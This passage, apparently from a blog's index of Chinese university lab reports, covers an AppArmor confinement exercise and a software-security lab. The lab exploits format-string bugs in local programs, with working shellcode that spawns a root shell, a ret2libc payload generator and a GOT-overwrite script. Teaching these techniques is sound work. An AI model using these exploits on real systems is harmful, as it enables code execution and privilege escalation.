class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /tmp/test.txt  </span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure><p>文件删除失败：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619190107460.png"alt="image-20240619190107460" /><figcaption aria-hidden="true">image-20240619190107460</figcaption></figure><p>获取shell失败：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619190000149.png"alt="image-20240619190000149" /><figcaption aria-hidden="true">image-20240619190000149</figcaption></figure><p>使用dmesg查看内核输出日志，发现两个拒绝规则，正是shell执行和unlink：</p><figure><imgsrc="https://pic1.zhimg.com/80/v2-942e24274ddd70aa2ded5bd3200b36f7_720w.png"alt="image-20240619191557469" /><figcaption aria-hidden="true">image-20240619191557469</figcaption></figure><h3 id="遇到的问题-1">遇到的问题</h3><p>一旦在配置文件中定义了对/tmp文件夹的拒绝，使用dmesg无法看到unlink被拒绝的消息，但不定义时可以看到，这感觉很奇怪。另一种可能性是包含的配置文件本身包含最基本的访问控制，包括unlink，但文件路径限制将直接导致一个问题，即<strong>访问拦截</strong>，<strong>文件访问请求在文件系统级别被完全拦截，程序可能没有机会尝试<code>unlink</code>操作</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 拒绝对/tmp目录中任何文件的读/写操作  </span><br><span class="line">deny /tmp/** mrwx,  </span><br></pre></td></tr></table></figure><h3 id="防御结果分析-3">防御结果分析</h3><p>AppArmor（应用程序保护）是一个Linux内核安全模块，用于限制程序的能力，允许系统管理员定义每个程序可以访问的资源。AppArmor使用基于路径的访问控制机制，通过配置文件定义程序的安全策略。</p><p>AppArmor的主要特性：</p><ol type="1"><li><strong>基于路径的访问控制</strong>：<ul><li>使用文件系统路径定义访问控制规则。</li><li>配置文件指定程序可以访问哪些文件、目录和资源。</li></ul></li><li><strong>配置文件</strong>：<ul><li>每个受保护程序都有一个相应的配置文件，通常位于<code>/etc/apparmor.d/</code>目录中。</li><li>配置文件定义程序的权限，包括文件访问、网络访问、能力等。</li></ul></li><li><strong>两种模式</strong>：<ul><li><strong>强制模式</strong>：严格执行配置文件中的规则，任何违反规则的行为将被阻止并记录。</li><li><strong>投诉模式</strong>：记录违反规则的行为，但不阻止操作。此模式通常用于调试和配置规则。</li></ul></li><li><strong>集成到Linux内核中</strong>：<ul><li>作为Linux安全模块（LSM）的一部分，直接在内核中实现，提供高效的安全控制。</li></ul></li><li><strong>灵活性</strong>：<ul><li>支持不同的抽象文件（如<code>&lt;abstractions/base&gt;</code>和<code>&lt;abstractions/apache2-common&gt;</code>），用于简化常见权限的配置。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> HUST 实验报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Information System Security Lab1-Software Security</title>
      <link href="/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab1-Software%20Security/"/>
      <url>/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab1-Software%20Security/</url>
      
        <content type="html"><![CDATA[<h1 id="信息系统安全实验1记录">信息系统安全实验1记录</h1><h2 id="prog1-修改变量值">prog1 修改变量值</h2><p>攻击方法：利用 printf 函数漏洞，使用 %.nx 来输出 n位长度的字符，然后使用 %n 将之前打印的字符长度写入指定地址。</p><ol type="1"><li><p>首先，配置环境并编译程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">禁用 ASLR</span></span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=0 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将 prog1.c 编译为 32 位，需要在源文件中将 fread 修改为 fgets</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">记得不要使用 -fno-stack-protector 选项</span></span><br><span class="line">gcc -z execstack -o prog1 prog1.c</span><br></pre></td></tr></table></figure></li><li><p>执行程序并查看布局</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">%08x | %08x | %08x | %08x | %08x</span></span><br><span class="line">.\prog1</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240607173607151.png"alt="1" /><figcaption aria-hidden="true">1</figcaption></figure></li><li><p>构造格式字符串以修改为 0x66887799</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_prog1_1.sh bfffed54</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240607181143060.png"alt="2" /><figcaption aria-hidden="true">2</figcaption></figure></li><li><p>构造格式字符串以修改为 0xdeadbeef</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_prog1_2.sh bfffed54</span><br></pre></td></tr></table></figure></li></ol><h2 id="prog2-shellcode-注入获取-shell">prog2 shellcode 注入，获取shell</h2><p>攻击方法：修改函数返回地址为注入的 <code>shellcode</code> 地址。注意shellcode 在栈上执行，因此 <strong>启用栈执行</strong>。</p><ol type="1"><li><p>启用栈保护和栈执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fstack-protector -z execstack prog2.c -o prog2</span><br></pre></td></tr></table></figure></li><li><p>查看相关地址，需要将返回地址覆盖为 shellcode 地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;%08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x | %08x&quot; &gt; input2</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240613165532651.png"alt="3" /><figcaption aria-hidden="true">3</figcaption></figure></li><li><p>还需要确认需要多少个 %.8x 来将指针指向 str 数组的开头</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240613173553393.png"alt="4" /><figcaption aria-hidden="true">4</figcaption></figure></li><li><p>我们的目标是将返回地址覆盖为数组中的一个位置，然后通过 sled指令获取 shell。在 exploit.py 中填写相应的参数。为了命中 sled指令，我们需要添加一个数字，需要尝试几次，基本上 80 就足够了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个 shellcode 创建一个本地 shell</span></span><br><span class="line">local_shellcode= (</span><br><span class="line">  <span class="string">&quot;\x31\xc0\x31\xdb\xb0\xd5\xcd\x80&quot;</span></span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">200</span></span><br><span class="line"><span class="comment"># 用 NOP 填充内容</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将代码放在末尾</span></span><br><span class="line">start = N - <span class="built_in">len</span>(local_shellcode)</span><br><span class="line">content[start:] = local_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将地址放在开头</span></span><br><span class="line">addr1 = <span class="number">0xffffd0ae</span></span><br><span class="line">addr2 = <span class="number">0xffffd0ac</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (addr1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>]  = (addr2).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 C 的值</span></span><br><span class="line">C = <span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 供调查用途（试错）</span></span><br><span class="line"><span class="comment">#s = &quot;%.8x_&quot;*C + &quot;%n&quot;  + &quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式字符串</span></span><br><span class="line">small = <span class="number">0xffff</span> - <span class="number">12</span> - C*<span class="number">8</span></span><br><span class="line">large = <span class="number">0x1d0c4</span> - <span class="number">0xffff</span> + <span class="number">75</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*C + <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(small) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%hn&quot;</span>        \</span><br><span class="line">                  + <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(large) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%hn&quot;</span> </span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将内容写入 badfile</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;input2&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">file.write(content)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure></li></ol><h2 id="prog2-ret2libc-注入获取-shell">prog2 ret2libc 注入，获取shell</h2><p>攻击方法：这需要启用栈不可执行保护，因此我们需要通过 ret2libc绕过它以获取 shell，即使用 <code>system("/bin/sh")</code></p><ol type="1"><li><p>启用 Stack Guard 和栈不可执行保护，编译命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fstack-protector -z noexecstack prog2.c -o prog2</span><br></pre></td></tr></table></figure></li><li><p>首先暂时运行程序</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171040392.png"alt="image-20240614171040392" /><figcaption aria-hidden="true">image-20240614171040392</figcaption></figure></li><li><p>接下来，需要找到相应的地址并构造控制流劫持前的栈细节。具体来说，需要找到<code>system()</code> 函数和字符串 <code>/bin/sh</code> 的地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方法 1 -- 通过 gdb 直接获取</span></span><br><span class="line">gdb -q prog2</span><br><span class="line">b printf</span><br><span class="line">run</span><br><span class="line">info proc map</span><br><span class="line">searchmem &quot;/bin/sh&quot; 0xb7d6a000 0xb7f1d000 # 在堆上从 libc 起始地址到结束地址搜索字符串</span><br><span class="line">p system</span><br><span class="line">p exit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方法 2 -- 通过计算获取（.so 基地址 + 偏移地址）</span></span><br><span class="line">ldd ./prog2</span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;system&quot;</span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;setuid&quot;</span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;exit&quot;</span><br><span class="line">ropper --file /lib32/libc.so.6 --string &quot;/bin/sh&quot;</span><br><span class="line">gdb -q prog2</span><br><span class="line">b printf</span><br><span class="line">run</span><br><span class="line">info proc map</span><br></pre></td></tr></table></figure><p>第一种方法结果：</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171317292.png"alt="image-20240614171317292" /> <imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171351094.png"alt="image-20240614171351094" /> <imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171414459.png"alt="image-20240614171414459" /></p><p>第二种方法结果：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614114521711.png"alt="image-20240614114521711" /><figcaption aria-hidden="true">image-20240614114521711</figcaption></figure><p>两种方法计算出的结果相同：system: 0xb7da4da0, exit: 0xb7d989d0,“/bin/sh”: 0xb7ec582b</p></li><li><p>构造 shellcode，将返回地址覆盖为 system 函数地址，返回地址+4 为exit 函数地址，返回地址+8 为 system 函数参数覆盖为 /bin/sh 地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">ret_addr, sh_str_addr, exit_addr, system_addr</span>):</span><br><span class="line">    N = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    addr = ret_addr</span><br><span class="line">    payload = (addr + <span class="number">10</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># /bin/sh 字符串地址的高 2 字节</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr + <span class="number">8</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># /bin/sh 字符串地址的低 2 字节</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr + <span class="number">6</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># exit 地址的高 2 字节</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr + <span class="number">4</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># exit 地址的低 2 字节</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr + <span class="number">2</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># system 地址的高 2 字节</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># system 地址的低 2 字节</span></span><br><span class="line"></span><br><span class="line">    sh_str_addr = <span class="built_in">int</span>(sh_str_addr, <span class="number">16</span>)</span><br><span class="line">    exit_addr = <span class="built_in">int</span>(exit_addr, <span class="number">16</span>)</span><br><span class="line">    system_addr = <span class="built_in">int</span>(system_addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造格式字符串</span></span><br><span class="line">    offsets = [</span><br><span class="line">        (sh_str_addr &gt;&gt; <span class="number">16</span>) - <span class="built_in">len</span>(payload),</span><br><span class="line">        (sh_str_addr &amp; <span class="number">0xffff</span>) - (sh_str_addr &gt;&gt; <span class="number">16</span>),</span><br><span class="line">        (exit_addr &gt;&gt; <span class="number">16</span>) - (sh_str_addr &amp; <span class="number">0xffff</span>),</span><br><span class="line">        (exit_addr &amp; <span class="number">0xffff</span>) - (exit_addr &gt;&gt; <span class="number">16</span>),</span><br><span class="line">        (system_addr &gt;&gt; <span class="number">16</span>) - (exit_addr &amp; <span class="number">0xffff</span>),</span><br><span class="line">        (system_addr &amp; <span class="number">0xffff</span>) - (system_addr &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如有必要，调整偏移量</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(offsets)):</span><br><span class="line">        <span class="keyword">if</span> offsets[i] &lt;= <span class="number">0</span>:</span><br><span class="line">            offsets[i] += <span class="number">0x10000</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">0</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%17$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">1</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%19$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">2</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%21$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">3</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%23$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">4</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%25$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">5</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%27$hn&quot;</span> + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    payload += (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N - <span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;生成格式字符串漏洞的有效负载。&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;ret_address&#x27;</span>, <span class="built_in">type</span>=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x, <span class="number">16</span>), <span class="built_in">help</span>=<span class="string">&quot;返回地址（十六进制）&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;sh_str_address&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;/bin/sh 字符串地址（十六进制）&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;exit_address&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;exit 函数地址（十六进制）&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;system_address&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;system 函数地址（十六进制）&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    payload = generate_payload(args.ret_address, args.sh_str_address, args.exit_address, args.system_address)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将内容写入 input2</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;input2&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_prog2_2.sh bfffeccc b7ec582b b7d989d0 b7da4da0</span><br></pre></td></tr></table></figure></li></ol><h2 id="prog2-got-表劫持调用-win-函数">prog2 GOT 表劫持，调用 win函数</h2><p>攻击方法：使用 printf 函数将 GOT 表中 printf 的偏移修改为 win函数地址，使得 fmtstf 函数中的最后一个 printf 执行 win 函数。</p><ol type="1"><li><p>查看 GOT 表，找到 printf 函数地址为 0x0804a00c</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -R prog2</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171850643.png"alt="image-20240614171850643" /><figcaption aria-hidden="true">image-20240614171850643</figcaption></figure></li><li><p>查看 PLT 表，看到 win 函数地址为 0x0804850b</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d prog2 | grep -A 18 win</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171908045.png"alt="image-20240614171908045" /><figcaption aria-hidden="true">image-20240614171908045</figcaption></figure></li><li><p>开始攻击</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用地址随机化</span></span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=2</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">win_addr, printf_addr</span>):</span><br><span class="line"></span><br><span class="line">    addr = printf_addr</span><br><span class="line">    payload = (addr + <span class="number">2</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># win 函数地址的高 2 字节</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># win 函数地址的低 2 字节</span></span><br><span class="line">    </span><br><span class="line">    win_addr = <span class="built_in">int</span>(win_addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算格式字符串的偏移值</span></span><br><span class="line">    offset1 = (win_addr &gt;&gt; <span class="number">16</span>) - <span class="number">3</span>*<span class="number">4</span> - <span class="number">8</span>*<span class="number">15</span></span><br><span class="line">    offset2 = (win_addr &amp; <span class="number">0xffff</span>) - (win_addr &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> offset2 &lt; <span class="number">0</span>:</span><br><span class="line">        offset2 += <span class="number">0x10000</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">&quot;%.8x&quot;</span> * <span class="number">15</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offset1) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offset2) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%hn&quot;</span> + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    payload += (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;生成格式字符串漏洞的有效负载。&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;win_address&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;win 函数地址（十六进制）&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;printf_address&#x27;</span>, <span class="built_in">type</span>=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x, <span class="number">16</span>), <span class="built_in">help</span>=<span class="string">&quot;printf 函数地址（十六进制）&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    payload = generate_payload(args.win_address, args.printf_address)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将内容写入 input2</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;input2&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 